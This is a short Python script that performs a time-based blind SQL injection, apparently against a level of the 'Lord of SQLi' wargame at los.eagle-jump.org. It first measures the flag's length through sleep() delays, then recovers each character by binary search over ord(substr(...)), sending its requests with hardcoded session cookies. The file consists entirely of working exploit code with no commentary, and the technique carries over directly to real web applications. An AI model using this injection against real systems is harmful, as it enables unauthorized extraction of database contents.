import requests
import time
def password_length():
	length=0
	while 1:
		length += 1
		query_add = query+"?flag=(sleep(3*(length(flag)="+str(length)+")))=(select 1 union select 2)"
		a=time.time()
		result=requests.get(query_add, cookies=cookie)
		b=time.time()
		if(b-a>2):
			print("Length is : "+str(length))
			return length

def password(index):
	first=0
	last=255
	while(first<last):
		mid=(first+last)//2
		query_add = query+"?flag=(sleep(3*(ord(substr(flag from "+str(index)+" for 1))>"+str(mid)+")))=(select 1 union select 2)"
		a=time.time()
		result=requests.get(query_add, cookies=cookie)
		b=time.time()
		if(b-a>2):
			first=mid+1
			if(last==first+1):
				query_add = query+"?flag=(sleep(3*(ord(substr(flag from "+str(index)+" for 1))="+str(first)+")))=(select 1 union select 2)"
				a=time.time()
				result=requests.get(query_add, cookies=cookie)
				b=time.time()
				if(b-a>2):
					return first
				else:
					return last
		else:
			last=mid
	
	return first

if(__name__=="__main__"):
	cookie={"__cfduid":"d5fd3bf70d66481907d3d06087b88ff011549863094","PHPSESSID":"afuov7bqip2lbk1o06n42o7g45"}
	query='https://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php'
	length=password_length()
	for i in range(1, length+1):
		print(chr(password(i)),end="")